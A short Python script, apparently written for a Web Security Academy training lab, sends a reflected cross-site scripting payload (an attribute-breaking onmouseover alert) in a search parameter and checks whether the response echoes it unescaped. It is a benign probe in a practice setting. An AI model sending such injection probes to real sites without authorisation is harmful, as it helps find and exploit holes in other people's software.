import requests

url = "https://0a7f0026032e661b808e12a600de0024.web-security-academy.net/"
payload = '" onmouseover="alert()'

response = requests.get(url + "?search=" + payload)
print(response.status_code)
index = response.text.find("0 search results for")
print(response.text[index - 50 : index + 50])

if payload in response.text:
    print("yes")
elif "&lt;" in response.text:
    print("shit")
else:
    print("we have nothing")
